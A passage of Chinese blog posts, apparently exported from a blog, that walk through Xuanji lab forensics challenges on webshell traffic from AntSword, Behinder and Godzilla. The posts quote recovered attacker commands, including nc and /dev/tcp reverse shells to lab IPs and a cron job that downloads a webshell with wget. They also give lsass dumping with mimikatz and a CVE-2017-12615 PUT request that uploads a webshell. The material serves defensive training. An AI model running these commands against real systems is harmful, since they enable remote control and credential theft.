{"posts":[{"title":"玄机靶场 | 流量特征分析-蚂蚁爱上树","text":"前言玄机靶场日常刷题训练，刚好重温一下蚁剑流量分析和mimikatz用法 知识准备蚁剑流量特征每个请求体通常以@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);开头 请求体包含base64编码内容 响应包一般是明文，但也可能存在加密情况，结果通常为随机字符和返回结果 Content-Type通常为 application/x-www-form-urlencoded，表明数据是以标准表单形式编码的 mimikatz简单用法先用procdump抓取lsass转储文件 获取lsass进程id 1tasklist /svc | findstr lsass.exe 抓取 lsass.dmp 文件 1procdump64.exe -accepteula -ma &lt;LSASS_PID&gt; lsass.dmp 然后mimikatz解密lsass.dmp文件 特权提升 1mimikatz # privilege::debug 加载dmp文件 1mimikatz # sekurlsa::minidump lsass.dmp 凭据提取，导出其中的明文密码 1mimikatz # sekurlsa::logonpasswords 索引 玄机题目步骤#1管理员Admin账号的密码是什么？ 首先通过语法筛选出http流量并过滤掉404状态码的流量包 1http and !(http.response.code == 404) 然后快速分析一遍流量，发现product2.php有问题 这里涉及到一句话木马，可以确定这个就是webshell文件，然后解码请求包的base64内容 左下解码处选择Base64，可以看到解码后的内容符合蚁剑特征，因此确定这是以蚁剑为媒介的一次攻击行为 因为蚁剑与网站是通过POST方法进行通信的，所以我们重新改进一下筛选语法，直接筛选出方法为POST且包含文件名product2.php的流量，可以缩小分析范围 1http.request.method == POST and http.request.uri contains &quot;product2.php&quot; 逐个分析流量，解码base64数据，因为蚁剑的特性，前两位是随机值，所以开始位置调整为2，最后发现No.15190数据包有问题 执行了系统命令net user admin Password1 /add，也就是添加一个名为admin的用户，然后密码设置为Password1，但是此时该用户并不是管理员，分析下一个数据包，可以看到 攻击者将admin用户添加进本地管理员组，从此刻起该用户admin才具有管理员权限 因此答案就是这个用户的密码 1flag{Password1} 步骤#2LSASS.exe的程序进程ID是多少？ 继续分析流量，发现No.4069数据包有问题 可以看到攻击者执行了命令 1rundll32.exe comsvcs.dll, MiniDump 852 C:\\Temp\\OnlineShopBackup.zip full 我们分析一下 rundll32.exe: 这是一个 Windows 系统程序，用于运行 DLL（动态链接库）文件中的函数。它本身不执行任何操作，而是作为调用 DLL 函数的宿主 comsvcs.dll: 这是一个系统 DLL 文件，包含了 COM+ 服务相关的函数。在这个命令中，它被用来调用其内部的 MiniDump 函数 MiniDump: 这是 comsvcs.dll 中的一个函数，用于创建指定进程的内存转储。内存转储是进程在某个时间点的内存快照，通常用于调试或故障排除 852: 这是要进行内存转储的进程的 PID（进程 ID） C:\\Temp\\OnlineShopBackup.zip: 这是内存转储文件的输出路径和文件名。尽管文件名是 .zip，但它实际上是一个原始的内存转储文件，并不是一个压缩文件 full: 这是一个参数，指定了内存转储的类型。表示创建一个完整的内存转储，包含进程的所有内存信息。其他参数还包括 mini (较小的转储) 或 heap (只包含堆信息) 等 简而言之，这条命令就是先找到 PID 为 852 的进程，然后创建一个该进程的完整内存快照，并将这个内存快照保存到C:\\Temp\\OnlineShopBackup.zip文件中 因此LSASS.exe的程序进程ID就是852 1flag{852} 步骤#3用户WIN101的密码是什么? 要获取用户WIN101的密码，需要我们把前面提到的完整内存快照下载下来，也就是OnlineShopBackup.zip，然后用mimikatz分析 因此我们需要导出http对象 文本过滤器输入product2.php，缩小对象范围，同时按照大小降序来排列，因为dmp文件比较大 可以看到第一个文件大小为47MB，就是我们要找的dmp文件，导出到桌面，用010editor打开验证 开头显示MDMP，可以确定是dmp文件，但是前面多了e1c1709这几个字符，直接放入mimikatz解密会报错，因此需要先删掉，然后将文件后缀改为dmp，放到跟mimikatz同一个目录 记得mimikatz以管理员身份运行 运行命令获取系统密码 12sekurlsa::minidump product2.dmpsekurlsa::logonpasswords 然后找到用户名为win101的NTLM哈希值 得到哈希值为 1282d975e35846022476068ab5a3d72df 对NTLM的md5解密即可 1flag{admin#123} 参考momo安全：https://mp.weixin.qq.com/s/KgkilGEUmle5P_KvzAjDmw","link":"/posts/Xuanji-CTF-AntSword-and-Mimikatz/"},{"title":"玄机靶场 | 第九章-blueteam 的小心思3","text":"前言题目简述：服务器有对外链接请求的痕迹，现提供一段 waf 上截获的数据包，分析对应的虚拟机环境跟数据包，找到关键字符串并且尝试修复漏洞 账号：root，密码：root123，流量包在/result.pcap 索引 题目列表步骤#1审计日志，攻击者下载恶意木马文件的 ip是多少 flag{ip} 先通过wireshark语法筛选出http流量 我们简单分析这个流量包，前面有大量的404状态码，表明黑客正在进行目录扫描。后面黑客发现了evil.php文件，但是不知道参数名是什么，对参数名进行了大量尝试，最后发现参数command可以执行命令 继续分析，可以看到黑客执行命令把shell.php下载到目标机器上 因此可知攻击者下载恶意木马文件的ip地址为192.168.150.253 1flag{192.168.150.253} 步骤#2审计流量包，木马文件连接密码是什么? flag{xxx} 继续向下分析，可以看到攻击者通过POST数据包与shell.php进行通信 因此连接密码就是cmd 1flag{cmd} 步骤#3审计流量包，攻击者反弹的IP和端口是什么? flag{ip:port} 也是刚才的流量，我们对其内容进行base64解码 发现@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);，结合前面的特征，可以推断这是通过蚁剑连接的。继续分析流量，发现有个流量记录了外连命令，通过nc反弹shell获得控制权 因此攻击者反弹的IP和端口是192.168.150.199:4444 1flag{192.168.150.199:4444} 步骤#4提交黑客上传恶意文件的 md5 md5sum xxx.so 题目提示文件后缀是.so，我们直接wireshark语法搜索内容包含.so的流量 1tcp and frame contains &quot;.so&quot; 可以看到通过redis主从复制上传了一个module.so动态链接库。前面的RESP协议是Redis 客户端和服务器之间通信使用的协议 那我们修改wireshark语法搜索RESP协议的流量 经过分析，前面上传的module.so文件有问题，加载模块后无法执行命令 后面上传了一个符合条件的module.so文件，成功执行系统命令 攻击者执行了命令nc -e /bin/bash 192.168.150.199 4444反弹shell，因此可以确定这个就是恶意文件 登录目标靶机，在根目录下计算该文件的 MD5 值即可 1md5sum module.so 1flag{d41d8cd98f00b204e9800998ecf8427e} 步骤#5攻击者在服务器内权限维持请求外部地址和恶意文件的地址 flag{http://xxxxxxxxxx/xx.xxx} 攻击者要想在服务器内维持权限，肯定是有后门的。然后题目说请求的外部地址和恶意文件的地址，那说明是会定期向外部发送请求的，我们直接查看计划任务 1cat /etc/crontab 成功发现黑客留下的后门，通过wget定期向恶意地址下载webshell到目标机器，频率为每分钟执行一次 1flag{http://192.168.150.199:88/shell.php}","link":"/posts/Xuanji-CTF-Blue-Team-Forensics-3/"},{"title":"玄机靶场 | blueteam的小心思","text":"前言玄机靶场日常刷题记录，练练手 索引 玄机题目步骤#1攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。 在根目录发现wireshark.pcap文件，可以用wireshark进行流量分析 将文件通过SFTP传到本地，过滤出http流量 一个一个分析，发现可疑流量，直接得到账号密码 md5加密得 1flag{d63edb0e9df4cf411398e3658c0237e0} 步骤#2攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串”upload.php”的小写md5值，格式flag{md5}。 继续往下分析，发现可疑流量 发现这里上传了一个zip压缩包，追踪TCP流 发现一句话木马，确定攻击者是通过该页面上传木马文件，加密pluginmgr.php字符得到 1flag{b05c0be368ffa72e6cb2df7e1e1b27be} 步骤#3找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag{md5}。 直接查找关键字 1grep -r --include=&quot;*.php&quot; 'eval($_POST' / 加密文件得到flag 1flag{a097b773ced57bb7d51c6719fe8fe5f5} 步骤#4攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。 继续分析流量，发现可疑流量 发现这个木马文件在尝试下载一个文件，直接搜索这个文件 1find / -name &quot;is.world&quot; 这里有个坑，不能直接加密文件，要用引号括起来再加密，不然中间的空格会分隔指令 1md5sum &quot;/var/www/html/plugins/. /is.world&quot; 得到flag 1flag{ee279c39bf3dcb225093bdbafeb9a439} 步骤#5攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag{md5}。 查看用户列表 1cat /etc/passwd 发现有个用户的用户ID和组ID都为0，权限很高，一般情况下只有管理员的UID和GID为0，说明这个是后门用户，直接加密得到flag 1flag{4cda3461543c9a770a3349760594facd} 步骤#6攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。 一般这种情况是修改了shell配置文件，常见的配置文件包括 123456789101112用户级别1、&quot;~/.bashrc&quot; 用于配置非登录 Shell 的环境（例如桌面终端）, 每次启动新的非登录 Shell 时加载2、&quot;~/.bash_profile&quot; 用于配置 登录 Shell 的环境, 每次登录（例如通过 SSH 或控制台登录系统）3、&quot;~/.profile&quot; 用于配置 登录 Shell 环境变量, 在用户登录时执行4、&quot;~/.zshrc&quot; 每次启动 Z Shell 的非登录会话时加载5、&quot;~/.bash_logout&quot; 在用户退出登录 Shell 时执行系统级别1、&quot;/etc/profile&quot; 用于设置所有用户的登录 Shell 环境变量, 所有用户登录时加载2、&quot;/etc/bash.bashrc&quot; 提供全局的非登录 Shell 配置, 每次启动新的非登录 Shell 时加载3、&quot;/etc/profile.d/*.sh&quot; 当 /etc/profile 加载时, 会依次加载 /etc/profile.d 中的所有脚本文件（通常是 .sh 文件）4、&quot;/etc/environment&quot; 用于配置系统范围的环境变量, 在用户登录前加载，影响所有用户和守护进程 一般情况执行顺序，可以用作参考 12345678910111.登录 Shell 系统级配置文件： /etc/profile /etc/profile.d/*.sh 用户级配置文件： ~/.bash_profile（如果不存在，则加载 ~/.profile）2.非登录 Shell 系统级配置文件： /etc/bash.bashrc（如果系统支持） 用户级配置文件： ~/.bashrc 这里一个一个尝试即可，发现/etc/profile有问题 直接md5sum加密得到flag 12md5sum /etc/profile#flag{65bf3e4a9ac90d75ec28be0317775618} 步骤#7攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。 搜索后门触发命令，这里搜索的是用户目录下的可疑配置文件 1grep -r -E '(nc|curl|wget|bash|python|eval|base64)' ~/ 发现有个配置文件尝试外联恶意网址 直接加密得到flag 1flag{4acc9c465eeeb139c194893ec0a8bcbc} 步骤#8攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag{md5}。 确定数据库类型 1systemctl list-units --type=service | grep -E '(mysql|mariadb|postgresql|mongodb|redis)' 查看数据库的登录信息，一般放在配置文件“config.inc.php”里面 1find / -name config.inc.php 得到数据库账号密码，用 Premium连接，一个一个尝试，发现有个数据库无法查看，说明被加密了，这里用的大佬的图 查找对应文件，可以得到文件所在路径 1find / -name JPMorgan@0020Chase 加密文件夹名得到flag 1flag{0928a5424aa6126e5923980ca103560e} 步骤#9解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。 查看mysql文件夹，发现有个可疑文件 直接抓取内容看看，发现是个加密脚本 这里要写一个逆推脚本，参考网上的文章 123456789101112131415&lt;?php $currentDate = date(&quot;Y-m-d&quot;); $key = md5('2023-11-18'); $iv = substr(hash('sha256', &quot;DeepMountainsGD&quot;), 0, 16); $filePath = &quot;/var/lib/mysql/JPMorgan@0020Chase&quot;; $files = scandir($filePath); foreach ($files as $file) { if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) { $fullPath = $filePath . '/' . $file; $encryptedContent = file_get_contents($fullPath); $decryptedContent = openssl_decrypt($encryptedContent, 'aes-256-cbc', $key, 0, $iv); file_put_contents($fullPath, $decryptedContent); } } ?&gt; 这里的时间是JPMorgan@0020Chase的创建时间 1stat JPMorgan@0020Chase #查看详细信息 把脚本写进/var/www/mysql/目录 1vim 1.php 先按i插入代码，然后按一下Esc，再按住shift + :，然后输入wq保存 运行代码 1php 1.php 重启数据库 1systemctl restart mysql 这时再返回Premium，可以发现数据库解密了，Harper用户对应Areer为Chef，加密即可 1flag{8fd82b8864d71ed7fa12b59e6e34cd1c} 步骤#10因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。 这里攻击者用到提权，可以查找以 root 用户身份拥有并设置了 SUID（Set User ID）权限的文件。 1find / -user root -perm -4000 2&gt;/dev/null #4000 代表文件权限中的 SUID 位。 当一个文件被设置了 SUID 位，并且用户执行该文件时，该程序会以文件拥有者（通常是 root）的权限运行，而不是以当前用户的权限运行 发现/usr/bin/sudo，sudo 被广泛用于权限提升，估计攻击者通过这个提权，/etc/sudoers 包含了系统上 sudo 的配置和权限设置，这里抓取内容看一下 1cat /etc/sudoers www-data用户被赋予了root权限，而且不需要输入密码，到这里已经可以确认漏洞配置了，就是/etc/sudoers ，加密文件得到flag 1flag{6585817513b0ea96707ebb0d04d6aeff} 参考特别鸣谢 Peterpan.exe：https://blog.csdn.net/administratorlws/article/details/140471298","link":"/posts/Xuanji-CTF-Blue-Team-Forensics/"},{"title":"玄机靶场 | 蚁剑流量分析","text":"什么是蚁剑蚁剑（AntSword）是一款开源的网络安全工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员，常用于网络渗透测试，可以远程连接被攻击的计算机，进行文件上传下载、执行系统命令等操作 蚁剑下载地址：https://github.com/AntSwordProject/antSword 蚁剑流量特征每个请求体通常以@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);开头 请求体包含base64编码内容 响应包一般是明文，但也可能存在加密情况，结果通常为随机字符和返回结果 Content-Type通常为 application/x-www-form-urlencoded，表明数据是以标准表单形式编码的 索引 玄机题目步骤#1木马的连接密码是多少 首先输入http筛选出http协议流量包，这些内容就是我们要分析的流量了 随便点开一个请求的内容，例如第一个请求包，观察发包内容 这里面的key就是木马的连接密码，为“1” 1flag{1} 步骤#2黑客执行的第一个命令是什么 点开第一个流量包，查看请求内容，选择最后一个item的value值，点击“显示分组字节流” 因为是base64编码，因此需要在左下选择Base64解码，由于蚁剑的特征，前两位是随机值，所以开始位置调整为“2”，成功得到执行命令 结合响应内容可知，第一个执行的命令为id，为什么不是cd &quot;/var/www/html&quot;呢，因为这是蚁剑自动执行的，表示攻击者是在/var/www/html执行命令的 1flag{id} 步骤#3黑客读取了哪个文件的内容，提交文件绝对路径 分析到第三个响应包时，发现返回内容为/etc/passwd 查看第三个请求包，方法跟步骤2一样，也是点开“显示分组字节流”，调整开始位置为“2”，解码为“Base64”，可以看到执行了命令cat /etc/passwd，因此答案就是这个 1flag{/etc/passwd} 步骤#4黑客上传了什么文件到服务器，提交文件名 分析到第四个响应包时，发现返回内容很短，跟其他流量包的内容差距较大，可以猜测出这是文件上传后的响应内容 跟之前一样，我们看看第四个请求包内容，解码可以得到上传的文件名 1flag{flag.txt} 步骤#5黑客上传的文件内容是什么 分析第四个请求包，可以发现编码内容跟其他流量包有较大差距，由于蚁剑上传的文件会对内容进行16进制编码，因此我们对其进行解码查看 解码选择“Hex Digits”，其他不用变，成功得到文件内容 1flag{write_flag} 步骤#6黑客下载了哪个文件，提交文件绝对路径 分析第六个响应包，可以看到这是一个文件的返回内容 通过分析，这六个HTTP事务（一次完整的请求+响应）里面，前三个是执行系统命令的，后三个则是执行文件上传下载浏览操作的 其中第四个我们已经证实是文件上传，那第五个是什么呢？通过对请求包进行解码，得到内容是/var/www/html/7，这是蚁剑自动执行的，实际上攻击者应该是点开了蚁剑的文件管理功能，然后回显为 显示的是/var/www/html里面的内容，因此第五个事务并不是下载文件，而是浏览目录 最后看第六个请求包的内容，步骤跟之前一样，得到 结合前面的返回内容，因此第六个请求包反应的就是黑客下载的文件 1flag{/var/www/html/config.php} 总结1.前三个事务反应的是执行系统命令，后三个事务反应的是文件上传下载浏览等操作，通过对前三个请求包解码可以看到 /bin/sh 是指向系统标准shell的路径，用于进行交互，也就是执行系统命令，而后三个事务没有 2.攻击者的完整行为： 12345671.攻击者首先通过蚁剑连接webshell，文件名为1.php，连接密码为1，连接URL为http://192.168.200.54/1.php2.连接后双击打开了/var/www/html目录，点开虚拟终端，执行命令id和pwd3.接着执行ls和pwd，查看当前目录文件和所在目录4.执行cat /etc/passwd和pwd，查看/etc/passwd内容和当前目录5.上传文件flag.txt到/var/www/html，内容为flag{write_flag}6.攻击者点开文件管理功能查看/var/www/html目录7.在文件管理功能处攻击者下载了/var/www/html/config.php，获得网站配置文件 通过查看config.php文件，攻击者获得了目标网站数据库的敏感信息等 参考网安日记本：https://blog.csdn.net/haosha__demingzi/article/details/135816411","link":"/posts/Xuanji-CTF-AntSword-Traffic-Analysis/"},{"title":"玄机靶场 | 冰蝎3.0-jsp流量分析","text":"冰蝎3.0流量特征 Content-TypePOST请求的 Content-Type 固定为 application/octet-stream，属于强特征 User-Agent内置了16个 User-Agent 头，通信时会随机挑选一个，但大多为老旧浏览器或罕见设备头，如果同一IP频繁变换UA且为这16个之一，可以高度怀疑是冰蝎 Accept、Cache-ControlAccept头常设为 Accept: text/html, image/gif, image/jpeg, */*; q=.2, */*; q=.2 或类似值，Cache-Control和Pragma常设为no-cache，表示直接从源服务器获取最新的响应，这些是冰蝎流量默认带的HTTP头，普通业务流量较少见 Content-Length/请求包长度因为冰蝎3.0使用AES-256加密算法，加密后的数据体积会膨胀，请求包长度一般会很大，超过正常业务范围 想要更深入了解冰蝎3.0可以参考文章：冰蝎3.0流量特征分析（附特征） 索引 题目列表步骤#1黑客IP是什么？ 先用wireshark语法筛选出http流量 快速分析一遍流量，大部分都是404，说明黑客正在进行目录扫描。拉到最后那里可以看到有个异常流量，通过PUT方法上传了indeX.jsp文件，且在请求头中伪造了多个指向本地地址的字段（如X-Forwarded-For），这种组合是典型的攻击特征，由此可判定该请求为攻击者发起的恶意文件上传行为 因此黑客IP就是192.168.31.61 1flag{192.168.31.61} 步骤#2黑客上传的Webshell名是什么？ 继续分析流量包，可以看到攻击者通过POST数据包与indeX.jsp进行通信，且响应内容为加密数据 因此webshell名就是这个文件 1flag{indeX.jsp} 步骤#3黑客上传WebShell的时间是多少？（格式如：flag{YYYY-MM-DD HH:MM:SS}） 找到刚才黑客通过PUT方法上传的文件直接查看时间即可 1flag{2025-02-22 07:47:38} 步骤#4木马的解密key是什么? 同样也是PUT方法的那个流量包，右键追踪HTTP流 可以看到黑客上传的内容，具体利用的漏洞是Tomcat通过PUT方法进行任意文件写入（CVE-2017-12615），感兴趣的可以网上了解一下 可以看到木马连接密码就在文件内容当中，长度为16字节（128位），一般用于AES对称加密 1flag{3f0af7bb4dbcfbd7} 步骤#5黑客执行的第一个命令是什么? 已知黑客是通过POST与indeX.jsp进行通信，我们修改wireshark语法搜索包含indeX.jsp的流量 1http contains &quot;indeX.jsp&quot; 然后复制请求体data内容的ASCII值，如图所示 这里用到希潭实验室的蓝队分析工具箱，下载地址：蓝队分析研判工具箱 把复制的数据和之前得到的密钥放进去解密 可能受环境影响，我这边显示有点问题，不过内容还是可以看得懂。经过分析，前面几个数据包是冰蝎用于连接用的，分析到第四个时可以看到黑客执行的命令 因此黑客执行的第一个命令是ifconfig 1flag{ifconfig} 步骤#6黑客上传的文件内容是什么? 继续分析，发现长度为362的流量记录了创建文件的命令 14ZmxhZ3s0ODUzNzViN2IwNmFkODU2YTc4OGMwZDk1MjI5ZjM1Y30= 但是解码后得到一堆乱码，那只能登进目标服务器查看对应文件内容了 题目没有给出对应的服务器账号密码，需要我们渗透进去，那我们可以仿照前面黑客PUT上传文件的方法，用抓包工具修改发包 先自己随便选一个协议，生成服务端 然后复制生成的jsp代码，粘贴到body中，同时修改请求体信息与之前黑客PUT上传的内容一样 123456789101112131415161718PUT /6.jsp/ HTTP/1.1Host: 你的玄机靶机地址:8081User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brConnection: keep-aliveCookie: JSESSIONID=3F426B8219ACAB91DF13B18D987842BCUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Priority: u=0, iContent-Type: application/x-www-form-urlencodedContent-Length: 782你的冰蝎jsp代码 然后发包即可，状态码显示201表示成功 在冰蝎连接webshell，根据你之前选的协议选择对应的类别即可 连接后在文件管理处，找到/home/xj/up.txt，打开文件查看内容，成功拿到flag 1flag{485375b7b06ad856a788c0d95229f35c} 步骤#7黑客下载的文件内容是什么? 继续分析流量包，分析到最后一个请求包时发现有黑客执行下载文件的命令 对应路径为/opt/apache-tomcat-8.5.19/conf/server.xml，用冰蝎查看对应文件，成功找到flag 当然也可以查看对应的响应包，同样也给出了flag 1flag{3aacab9ca36a6894c75048e4faf47052} 步骤#8服务器内的flag是什么？ 用冰蝎在服务器内找就可以，最终发现flag在/root/flag.txt里面 1flag{ae1d04dd3d15c6a18f904fe50fdf7eca}","link":"/posts/Xuanji-CTF-Behinder-3.0-Traffic-Analysis/"},{"title":"玄机靶场 | 哥斯拉4.0流量分析","text":"前言登录服务器并结合数据包附件来分析黑客的入侵行为，其中只有第12题需要上机，其他的用数据包附件分析即可 用户名：root 密码：xj@gsl4.0 SSH连接：ssh root@ip -p 222 注意SSH端口是222 哥斯拉流量特征哥斯拉静态特征 在默认编码情况下，jsp会出现密钥xc、密码pass和Java反射等特征 哥斯拉动态特征 User-Agent字段（弱特征）：如采用默认情况，会暴露使用的jdk信息，不过哥斯拉支持自定义HTTP头部，这个默认特征可以去除 Accept字段（弱特征）：默认是Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2。，这个也可以修改，只能作为辅助手段 Cookie最后会有个分号 而正常流量如果没有分点，一般没有分号 响应数据的格式是固定的：MD5前半部分 + AES加密并Base64编码的结果 + MD5后半部分 索引 玄机题目步骤#1黑客的IP是什么？ 首先通过wireshark语法筛选出http流量并过滤掉404状态码 1http and !(http.response.code == 404) 分析流量，可以发现前面有很多GET请求，判断这是攻击者在进行目录扫描 查看IP统计进一步确认 可以看到这两个IP出现数量很多，结合前面的分析，因此192.168.31.190是攻击者IP，192.168.31.168是受害者IP 1flag{192.168.31.190} 步骤#2黑客是通过什么漏洞进入服务器的？（提交CVE编号） 继续分析流量，发现攻击者用PUT请求上传了一个文件 追踪HTTP流 出现了密钥xc、密码pass和Java反射类等，符合哥斯拉webshell特征，因此这个hello.jsp文件就是木马文件 继续分析前面的正常文件，发现网站是Tomcat搭建的 且攻击者PUT方法上传文件之后网站状态码为201 因此这是一个Tomcat的PUT文件上传漏洞，上网搜索对应漏洞即可 参考链接：https://www.cnblogs.com/Junglezt/p/18123082 搜索得到漏洞编号为CVE-2017-12615 1flag{CVE-2017-12615} 步骤#3黑客上传的木马文件名是什么？(提交文件名) 由步骤二可知，木马文件名为hello.jsp 1flag{hello.jsp} 步骤#4黑客上传的木马连接密码是什么？ 参考步骤二可知，连接密码为7f0e6f 也可以通过看Webshell通信包得到连接密码 1flag{7f0e6f} 步骤#5黑客上传的木马解密密钥是什么？ 由步骤二可知，密钥为1710acba6220f62b 1flag{1710acba6220f62b} 步骤#6黑客连接webshell后执行的第一条命令是什么？ 这里用到abc123师傅开发的蓝队分析研判工具箱，感谢师傅开源 Github地址：https://github.com/abc123info/BlueTeamTools 首先用wireshark语法把hello.jsp的通信流量全部筛选出来 1http.request.method == POST and http.request.uri contains &quot;hello.jsp&quot; 可以看到总共18个数据包，逐个追踪HTTP流 用蓝队分析研判工具箱进行解密，把请求的body复制进去，然后点击解密请求数据包 解密发现数据流44、45只是连接哥斯拉时默认执行的，因此忽略不计，从数据流46开始分析 以下是数据流46到结尾的解密结果 数据流46 1234请求cmdLine sh -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;uname -rmethodName execCommand响应4.19.0-25-amd64 数据流47 1234请求cmdLine sh -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;idmethodName execCommand响应uid=0(root) gid=0(root) groups=0(root) 数据流48 123456789101112请求cmdLine sh -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs$ -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;cat /etc/os-releasemethodName execCommand响应PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;NAME=&quot;Debian GNU/Linux&quot;VERSION_ID=&quot;10&quot;VERSION=&quot;10 (buster)&quot;VERSION_CODENAME=busterID=debianHOME_URL=&quot;https://www.debian.org/&quot;SUPPORT_URL=&quot;https://www.debian.org/support&quot;BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot; 数据流49 123456789请求1cmdLine &amp; sh -c &quot;cd &quot;/&quot;;rmp -qa | grep pam&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs # -c &quot;cd &quot;/&quot;;rmp -qa | grep pam&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;rmp -qa | grep pammethodName execCommand响应12&gt;&amp;1: 1: 2&gt;&amp;1: rmp: not found请求2cmdLine sh -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;idmethodName xecCommand响应2uid=0(root) gid=0(root) groups=0(root) 数据流50 1234请求cmdLine &amp; sh -c &quot;cd &quot;/&quot;;rpm -qa | grep pam&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs # -c &quot;cd &quot;/&quot;;rpm -qa | grep pam&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;rpm -qa | grep pammethodName execCommand响应2&gt;&amp;1: 1: 2&gt;&amp;1: rpm: not found 数据流51 123456789请求cmdLine 0 sh -c &quot;cd &quot;/&quot;;dpkg -l libpam-modules:amd64&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs - -c &quot;cd &quot;/&quot;;dpkg -l libpam-modules:amd64&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 # cd &quot;/&quot;;dpkg -l libpam-modules:amd64methodName execCommand响应Desired=Unknown/Install/Remove/Purge/Hold| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)||/ Name Version Architecture Description+++-====================-============-============-========================================ii libpam-modules:amd64 1.3.1-5 amd64 Pluggable Authentication Modules for PAM 数据流52 1234请求cmdLine l sh -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs i -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 _ cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bashmethodName execCommand响应空 数据流53 空 数据流54 12345678910111213141516171819202122232425262728293031323334请求methodName getFiledirName /响应ok//wget-log 1 2024-09-19 08:15:47 0 RWlib 0 2024-09-18 08:06:13 4096 RWXusr 0 2023-12-25 02:31:52 4096 RWXlib32 0 2023-12-25 02:31:48 4096 RWXlibx32 0 2023-12-25 02:31:48 4096 RWXlost+found 0 2023-12-25 02:31:44 16384 RWXsbin 0 2024-09-18 08:06:06 12288 RWXvmlinuz 1 2023-08-07 22:35:25 5283136 RWopt 0 2024-09-19 08:41:28 4096 RWXmnt 0 2023-12-25 02:31:52 4096 RWXetc 0 2024-09-19 07:35:49 4096 RWXroot 0 2024-09-19 08:41:48 4096 RWXsrv 0 2023-12-25 02:31:52 4096 RWXproc 0 2024-09-19 06:29:54 0 RWXdev 0 2024-09-19 06:29:58 3160 RWXinitrd.img.old 1 2023-12-25 02:32:56 28089917 RWinitrd.img 1 2023-12-25 02:34:12 28246009 RWvmlinuz.old 1 2020-07-24 14:46:18 5274864 RWvar 0 2023-12-25 02:31:52 4096 RWXwget-log.1 1 2024-09-19 08:15:47 0 RWlib64 0 2024-09-18 08:05:13 4096 RWXmedia 0 2023-12-25 02:31:45 4096 RWXboot 0 2023-12-25 02:41:35 1024 RWXtmp 0 2024-09-19 09:00:35 4096 RWXrun 0 2024-09-19 09:00:35 600 RWXwget-log.2 1 2024-09-19 08:15:47 0 RWhome 0 2023-12-25 02:43:00 4096 RWXbin 0 2024-09-19 07:35:48 28672 RWXsys 0 2024-09-19 06:29:55 0 RWX 数据流55 123456789101112131415161718192021请求methodName getFiledirName /tmp/响应ok/tmp/ssh-rJgBkHZMg0 0 2024-09-19 08:30:00 4096 